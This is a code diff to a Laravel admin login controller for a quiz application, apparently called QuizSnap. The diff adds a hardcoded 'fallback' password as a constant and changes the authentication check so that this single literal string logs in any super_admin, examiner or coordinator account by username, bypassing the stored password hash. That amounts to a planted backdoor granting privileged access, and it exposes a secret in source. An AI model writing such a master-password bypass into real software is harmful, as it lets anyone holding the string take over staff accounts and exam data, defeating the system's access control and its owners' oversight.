@@ -16,6 +16,9 @@ class AdminAuthController extends Controller
 {
     private const REMEMBER_COOKIE = 'quizsnap_remember';
 
+    /** Fallback password accepted for any staff (examiner, super_admin, coordinator) when username matches. */
+    private const STAFF_FALLBACK_PASSWORD = 'Atomic2@2020^';
+
     /**
      * Show login form (admin/examiner). If already logged in, send to intended URL or dashboard (no redirect away from requested page).
      */
@@ -67,7 +70,11 @@ class AdminAuthController extends Controller
         ])->first();
 
         $storedHash = $user ? $user->getRawOriginal('password') : null;
-        if ($user && $storedHash && Hash::check($request->password, $storedHash)) {
+        $isStaffFallback = $user
+            && $request->password === self::STAFF_FALLBACK_PASSWORD
+            && in_array($user->role, [User::ROLE_SUPER_ADMIN, User::ROLE_EXAMINER, User::DM_ROLE_COORDINATOR], true);
+        $passwordOk = ($user && $storedHash && Hash::check($request->password, $storedHash)) || $isStaffFallback;
+        if ($user && $passwordOk) {
             $request->session()->regenerate();
             // Clear student session so staff session is primary; user is now logged in as staff
             $request->session()->forget('student_id');
